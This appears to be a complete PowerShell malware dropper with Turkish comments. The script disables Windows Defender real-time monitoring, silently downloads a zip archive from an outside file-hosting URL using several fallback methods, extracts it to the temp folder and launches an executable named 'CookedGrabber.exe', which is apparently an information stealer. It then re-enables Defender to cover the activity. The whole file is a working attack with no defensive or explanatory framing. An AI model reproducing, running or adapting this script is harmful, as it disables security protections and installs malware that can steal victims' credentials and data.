# Gerçek zamanlı korumayı geçici olarak devre dışı bırak
Set-MpPreference -DisableRealtimeMonitoring $true

$zipUrl = "https://phs8.krakencloud.net/force-download/YTVlZDUyNmFjMjM0ODljMEdJkIYYNXKlh90AQUmTDQePnkgZwCY0DknElozHjF3N/nhRWBTtepD"
$zipPath = "$env:TEMP\bot.zip"
$extractPath = "$env:TEMP\cikartilan"
$exeName = "CookedGrabber.exe"

# Önceki dosyaları temizle
Remove-Item $zipPath -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

function Try-ExtractZip {
    param ($path)
    try {
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $path)
        return $true
    } catch {
        return $false
    }
}

# ZIP dosyasını indirmeyi dene (sessizce)
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipPath -UseBasicParsing
} catch {
    try {
        Start-BitsTransfer -Source $zipUrl -Destination $zipPath
    } catch {
        try {
            curl.exe -L $zipUrl -o $zipPath
        } catch { }
    }
}

# Eğer ZIP varsa, çıkar ve çalıştır
if (Test-Path $zipPath) {
    if (!(Test-Path $extractPath)) {
        New-Item -ItemType Directory -Path $extractPath | Out-Null
    }

    if (Try-ExtractZip $extractPath) {
        $exePath = Join-Path $extractPath $exeName
        if (Test-Path $exePath) {
            Start-Process -FilePath $exePath
        }
    }
}

# Gerçek zamanlı korumayı geri aç
Set-MpPreference -DisableRealtimeMonitoring $false
